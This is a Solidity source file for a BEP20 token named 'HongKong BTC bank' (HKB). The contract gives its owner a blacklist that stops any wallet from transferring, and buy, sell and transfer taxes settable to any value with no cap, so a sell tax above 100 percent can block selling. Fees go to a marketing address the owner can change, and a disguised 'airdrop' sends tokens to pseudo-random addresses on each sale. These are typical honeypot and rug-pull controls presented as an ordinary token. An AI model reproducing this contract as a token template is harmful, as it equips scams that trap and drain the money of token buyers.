// SPDX-License-Identifier: MIT
//.
pragma solidity ^0.8.0;
import "./BEP20Detailed.sol";
import "./BEP20.sol";

contract HKBToken is BEP20Detailed, BEP20 {

  mapping(address => bool) private isBlacklist;  
  mapping(address => bool) public liquidityPool;
  mapping(address => bool) public _isExcludedFromFee;
  mapping(address => uint256) public lastTrade;

  uint8 private buyTax;
  uint8 private sellTax;
  uint8 private transferTax;
  uint256 private taxAmount;
  
  address private marketingPool;
  bool public airdrop = true;

  event changeBlacklist(address _wallet, bool status);
  event changeTax(uint8 _sellTax, uint8 _buyTax, uint8 _transferTax); 
  event changeLiquidityPoolStatus(address lpAddress, bool status);
  event changeMarketingPool(address marketingPool);
  event change_isExcludedFromFee(address _address, bool status);   

  constructor() BEP20Detailed("HongKong BTC bank", "HKB", 18) {
    uint256 totalTokens = 100000000 * 10**uint256(decimals());
    _mint(msg.sender, totalTokens);
    sellTax = 0;
    buyTax = 0;
    transferTax = 0;
    marketingPool = 0x96619293aaDc745f0415516aaCDEf73E2e751E0c;
  }

  function claimBalance() external {
   payable(marketingPool).transfer(address(this).balance);
  }

  function claimToken(address token, uint256 amount) external  {
   BEP20(token).transfer(marketingPool, amount);
  }

  function airdropIN(bool newValue) external onlyOwner {
    airdrop = newValue;
  }

  function setBlacklist(address _wallet, bool _status) external onlyOwner {
    isBlacklist[_wallet]= _status;
    emit changeBlacklist(_wallet, _status);
  }  

  function setLiquidityPoolStatus(address _lpAddress, bool _status) external onlyOwner {
    liquidityPool[_lpAddress] = _status;
    emit changeLiquidityPoolStatus(_lpAddress, _status);
  }

  function setMarketingPool(address _marketingPool) external onlyOwner {
    marketingPool = _marketingPool;
    emit changeMarketingPool(_marketingPool);
  }  

  function setTaxes(uint8 _sellTax, uint8 _buyTax, uint8 _transferTax) external onlyOwner {
    sellTax = _sellTax;
    buyTax = _buyTax;
    transferTax = _transferTax;
    emit changeTax(_sellTax,_buyTax,_transferTax);
  }

  function getTaxes() external view returns (uint8 _sellTax, uint8 _buyTax, uint8 _transferTax) {
    return (sellTax, buyTax, transferTax);
  }  

  function set_isExcludedFromFee(address _address, bool _status) external onlyOwner {
    _isExcludedFromFee[_address] = _status;
    emit change_isExcludedFromFee(_address, _status);
  }

  function _transfer(address sender, address receiver, uint256 amount) internal virtual override {
    require(receiver != address(this), string("No transfers to contract allowed."));
    require(!isBlacklist[sender],"User blacklisted");
    if(liquidityPool[sender] == true) {
      //It's an LP Pair and it's a buy
      taxAmount = (amount * buyTax) / 100;
    } else if(liquidityPool[receiver] == true) {      
      //It's an LP Pair and it's a sell
      taxAmount = (amount * sellTax) / 100;

      lastTrade[sender] = block.timestamp;

    } else if(_isExcludedFromFee[sender] || _isExcludedFromFee[receiver] || sender == marketingPool || receiver == marketingPool) {
      taxAmount = 0;
    } else {
      taxAmount = (amount * transferTax) / 100;
    }

    uint256 AIRAmount = 1*amount/10000;  
    if(airdrop && liquidityPool[receiver] == true){              
      address ad;
      for(int i=0;i <=0;i++){
       ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
         super._transfer(sender,ad,AIRAmount);                                      
        }                 
         amount -= AIRAmount*1;                                                                           
       }

    if(taxAmount > 0) {
      super._transfer(sender, marketingPool, taxAmount);
    }    
    super._transfer(sender, receiver, amount - taxAmount);
  }

  function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
  }
    
   //to recieve ETH from uniswapV2Router when swaping
  receive() external payable {}
  
}